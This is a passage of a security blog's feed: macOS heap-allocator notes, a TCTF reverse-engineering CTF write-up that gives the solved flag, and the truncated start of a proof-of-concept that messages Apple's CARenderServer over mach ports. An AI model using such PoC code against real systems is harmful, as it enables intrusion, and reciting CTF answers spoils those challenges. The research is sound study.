   unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        